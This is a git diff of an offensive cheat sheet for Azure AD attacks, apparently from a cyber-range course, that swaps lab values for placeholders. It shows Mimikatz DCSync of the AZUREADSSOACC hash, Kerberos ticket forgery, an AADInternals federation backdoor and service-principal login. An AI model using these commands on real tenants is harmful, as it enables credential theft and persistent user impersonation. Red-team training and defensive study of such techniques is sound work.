@@ -12,12 +12,12 @@
 
 #### Get NTLM hash of AZUREADSSOC account
 ```
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:defeng\azureadssoacc$ /domain:defeng.corp /dc:defeng-dc.defeng.corp"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\azureadssoacc$ /domain:<DOMAIN> /dc:<DC NAME>"'
 ```
 
 #### Create a silver ticket
 ```
-Invoke-Mimikatz -Command '"kerberos::golden /user:onpremadmin1 /sid:S-1-5-21-938785110-3291390659-577725712 /id:1108 /domain:defeng.corp /rc4:<> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"' 
+Invoke-Mimikatz -Command '"kerberos::golden /user:<USERNAME> /sid:<SID> /id:1108 /domain:<DOMAIN> /rc4:<HASH> /target:aadg.windows.net.nsatc.net /service:HTTP /ptt"' 
 ```
 
 ## Add credentials to enterprise applications
@@ -46,7 +46,7 @@ If we have GA privileges on a tenant, we can add a new domain (must be verified)
 #### Add a domain with AADInternal
 ```
 Import-Module .\AADInternals.psd1
-ConvertTo-AADIntBackdoor -DomainName cyberranges.io 
+ConvertTo-AADIntBackdoor -DomainName <DOMAIN>
 ```
 
 #### Get immutableID of the user that we want to impersonate. Using Msol module
@@ -70,7 +70,7 @@ New-AADIntADFSSelfSignedCertificates
 
 #### Update the certificate information with AzureAD
 ```
-Update-AADIntADFSFederationSettings -Domain cyberranges.io
+Update-AADIntADFSFederationSettings -Domain <DOMAIN>
 ```
 
 ## Storage account access keys
@@ -89,13 +89,13 @@ Update-AADIntADFSFederationSettings -Domain cyberranges.io
 ```
 $passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential ("<ACCOUNT ID>", $passwd) 
-Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant <TENAND ID>
+Connect-AzAccount -ServicePrincipal -Credential $credentials -Tenant <ID>
 ```
 
 #### For certificate based authentication
 ```
-Connect-AzAccount -ServicePrincipal -Tenant <TenantId> -
-CertificateThumbprint <Thumbprint> -ApplicationId <ApplicationId>
+Connect-AzAccount -ServicePrincipal -Tenant <ID> -
+CertificateThumbprint <Thumbprint> -ApplicationId <ID>
 ```
 
 ## Illicit Consent Grant
